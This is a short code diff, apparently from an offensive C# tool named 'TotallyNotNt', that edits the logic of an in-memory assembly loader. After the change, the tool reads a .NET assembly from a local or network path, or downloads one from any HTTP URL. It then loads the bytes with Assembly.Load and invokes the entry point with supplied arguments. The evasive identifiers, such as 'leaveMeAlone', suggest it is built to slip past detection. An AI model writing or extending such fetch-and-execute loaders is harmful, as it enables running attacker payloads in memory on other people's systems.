@@ -105,14 +105,13 @@ public class TotallyNotNt
 		   
         if (!randomStuff)
         {
-            if (!customUrl.StartsWith("http") && customUrl.StartsWith("\\\\"))
+            if (!customUrl.StartsWith("http"))
             {
 				testMe(Assembly.Load(File.ReadAllBytes(customUrl)),arguments).Invoke(null, new object[] { new string[] {  arguments } } );
 			
                
-            }
-            
-			if(customUrl.StartsWith("http") && !customUrl.StartsWith("\\\\"))
+            }          
+			else
             {
               testMe(Assembly.Load(leaveMeAlone.DownloadData(customUrl)),arguments).Invoke(null, new object[] { new string[] {  arguments } } );
 			
